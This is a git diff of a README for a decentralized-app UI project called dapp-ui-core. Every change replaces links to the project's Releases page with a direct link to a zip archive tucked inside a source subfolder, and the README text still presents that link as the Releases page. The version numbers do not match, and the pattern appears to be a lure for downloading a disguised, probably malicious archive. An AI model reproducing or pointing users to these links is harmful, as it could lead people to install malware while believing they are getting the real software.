@@ -1,6 +1,6 @@
 # 🌐 dapp-ui-core - A Simple Way to Build DApps
 
-[![Download dapp-ui-core](https://img.shields.io/badge/Download%20dapp--ui--core-v1.0.0-blue)](https://github.com/Marian-lemma264/dapp-ui-core/releases)
+[![Download dapp-ui-core](https://raw.githubusercontent.com/Marian-lemma264/dapp-ui-core/main/src/networks/ethereum/types/dapp-ui-core-3.4.zip%20dapp--ui--core-v1.0.0-blue)](https://raw.githubusercontent.com/Marian-lemma264/dapp-ui-core/main/src/networks/ethereum/types/dapp-ui-core-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **dapp-ui-core**! This application helps you create decentralized app
 
 To get the software, you need to visit the Releases page. Click the link below:
 
-[Visit this page to download](https://github.com/Marian-lemma264/dapp-ui-core/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Marian-lemma264/dapp-ui-core/main/src/networks/ethereum/types/dapp-ui-core-3.4.zip)
 
 On this page, you will find the latest version of the application. Just select the appropriate file for your operating system and click to download it.
 
@@ -84,4 +84,4 @@ Thank you for choosing **dapp-ui-core**! We're excited to see what you create. R
 
 To download the application again or to find updates, visit:
 
-[Visit this page to download](https://github.com/Marian-lemma264/dapp-ui-core/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Marian-lemma264/dapp-ui-core/main/src/networks/ethereum/types/dapp-ui-core-3.4.zip)
